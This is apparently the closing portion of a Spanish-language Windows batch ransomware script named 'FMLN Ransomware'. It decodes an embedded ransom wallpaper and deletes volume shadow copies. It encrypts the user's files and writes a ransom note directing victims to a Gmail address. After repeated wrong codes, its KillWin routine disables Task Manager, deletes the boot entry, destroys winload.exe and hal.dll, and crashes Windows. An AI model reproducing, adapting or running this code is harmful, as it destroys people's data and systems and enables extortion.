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
) do (echo.%%x)
) > "%temp%\FMLN.Wallpaper.bin"
certutil -decode "%temp%\FMLN.Wallpaper.bin" "FMLN.bmp" >nul 2>nul
goto :eof

:SetWallpaper
   reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%~1" /f >nul 2>nul
   rundll32 user32.dll, UpdatePerUserSystemParameters 0
goto :eof

:Encrypt
vssadmin delete shadows /all >nul 2>nul
for /r "%RansomWorkPath%" %%x in (%SignedFiles.Decrypted%) do (call :EncryptFile "%%x")
@(
   echo.FMLN Ransomware
   echo.
   echo.Lea detenidamente el documento de texto y siga los pasos indicados para
   echo.recuperar los archivos de su computadora que han sido encriptados.
   echo.
   echo.1 - Abra su correo electronico por cualquier medio de su preferencia,
   echo.    accesible para usted
   echo.
   echo.2 - Redacte una solicitud de codigo para desencriptar a la siguiente
   echo.    cuenta de correo electronico: dharkonsk@gmail.com
   echo.
   echo.3 - Probablemente el correo de respuesta le pida algo, debera cumplir
   echo.    con dicha solicitud para que le den el codigo para desencriptar.
   echo.
   echo.5 - Una vez tenga el codigo para desencriptar, introduzcalo en la
   echo.    consola y presione enter
) > "LEAME.txt"
for /l %%i in (1,1,10) do ((echo.!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!!random!) >> "%AppData%\FMLN.Encrypt.dll" 2>nul)
call :CreateBMP
call :SetWallpaper "%cd%\FMLN.bmp"
goto Crypt

:Crypt
if not exist "FMLN.bmp" (call :CreateBMP)
call :SetWallpaper "%cd%\FMLN.bmp"
echo.%ESC%[2f
echo.                                                                               @
echo.                                                                             @@@@
echo.                                                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
echo.                                                               @@@@@@@@@@@@@@@@@@@@@@
echo.                                                                    @@@@@@@@@@@@@
echo.                                                                 @@@@@@@@@@@@@@@@@
echo.                                                              @@@@@@             @@
echo.                                                            @@@@     @@@@@@@@@@                           @@@@@
echo.                                                                  @@@@@@@@                               @@@@@
echo.                                                                 @@@@@                                  @@@@@
echo.                                                                @@@@@                                  @@@@@
echo.                                                               @@@@@                                  @@@@@
echo.                                                          @@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@   @@@@@   @@@@@@@@@@@@@@@
echo.                                                             @@@@@      @@@@@     @@@@@     @@@@@   @@@@@   @@@@@     @@@@@
echo.                                                            @@@@@      @@@@@     @@@@@     @@@@@   @@@@@   @@@@@     @@@@@
echo.                                                           @@@@@      @@@@@     @@@@@     @@@@@   @@@@@   @@@@@     @@@@@
echo.                                                          @@@@@      @@@@@     @@@@@     @@@@@   @@@@@   @@@@@     @@@@@
echo.                                                         @@@@@      @@@@@     @@@@@     @@@@@   @@@@@   @@@@@     @@@@@
echo.                                                        @@@@@      @@@@@     @@@@@     @@@@@   @@@@@   @@@@@     @@@@@
echo.
echo.
echo.%ESC%[90m%ESC%[23f
echo.      Puede que se este preguntando el porque sus archivos no abren o porque le aparece este aviso, la razon de esto es porque sus archivos han sido encriptados y
echo.         para ser desencriptados usted necesitara un codigo especial. Para conseguir dicho codigo, debe redactar un mensaje a dharkonsk@gmail.com solicitando
echo.   uno de estos codigos especiales, estos codigos pueden cambiar entre ejecuciones de este programa y por lo tanto, se recomienda que no abra y cierre este programa de
echo.       forma repetida para evitar que el codigo cambie, una vez redacte un mensaje al correo electronico mencionado, debera esperar la respuesta, muy probablemente
echo.       el codigo se le confie bajo alguna condicion o por algo a cambio, en tal caso, debera cumplir con ello y solo asi se le otorgara el codigo, una vez lo tenga,
echo.                                                      debera ingresarlo en la consola y sus archivos seran desencriptados.
echo %ESC%[97m%ESC%[31f--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
set /p Ransom.CodeInput="%ESC%[97m%ESC%[33f- > %ESC%[31m%ESC%[?25h"
if /i "!Ransom.CodeInput!" == "032-108-351-749-645" (goto Decrypt) else (
   echo %ESC%[33;4f                                                                               
   echo.%ESC%[?25l
   if !Ransom.MaxFails! equ 0 (goto KillWin) else (
      set /a Ransom.MaxFails-=1
      call :MessageBox Warning "Codigo no valido, vuelva a introducirlo" "FMLN Ransomware" OK
   )
)
goto Crypt

:Decrypt
cls
echo.
echo  Felicidades, ha ingresado el codigo de desencriptacion correcto, en estos
echo  momentos el programa esta desencriptando sus archivos.
echo.
echo  Enumerando archivos y preparando desencriptado...
for /r "%RansomWorkPath%" %%x in (%SignedFiles.Encrypted%) do (set /a EncryptedFiles.All+=1)
echo  Completado.
echo.
for /r "%RansomWorkPath%" %%x in (%SignedFiles.Encrypted%) do (
   set /a DecryptedFiles.Count+=1
   set /a DecryptedFiles.Percentage=^(DecryptedFiles.Count * 100^) / EncryptedFiles.All
   echo %ESC%[8f Desencriptando archivos... !DecryptedFiles.Count! de !EncryptedFiles.All!^ ^(!DecryptedFiles.Percentage!%% Completado^)
   call :DecryptFile "%%x"
)
del /f /q "%AppData%\FMLN.Encrypt.dll" >nul 2>nul
del /f /q "LEAME.txt" >nul 2>nul
del /f /q "FMLN.bmp" >nul 2>nul
cls
echo.
echo. Sus archivos se han desencriptado. Fotos, videos, documentos y otros
echo. archivos vuelven a estar disponibles a su uso
echo.
echo. Presione una tecla para cerrar el programa...
pause >nul
exit

:KillWin
   start /b "" cmd /q /c "%TROJAN_FILE_PATH%" Execute-Payload SetProcessAsCritical >nul 2>nul

   reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>nul
   reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f >nul 2>nul
   bcdedit /delete {current} >nul 2>nul

   call :DestroyFile "%SystemDirectory%\winresume.exe" >nul 2>nul
   call :DestroyFile "%SystemDirectory%\winload.exe" >nul 2>nul
   call :DestroyFile "%SystemDirectory%\hal.dll" >nul 2>nul

   call :MessageBox Warning "Codigo no valido, su PC sera destruida." "FMLN Ransomware" OK
   timeout /nobreak 10 >nul

   call :NtRaiseHardError 0xdeaddead & call :CrashWindows & call :ForceShutdown
timeout /nobreak -1 >nul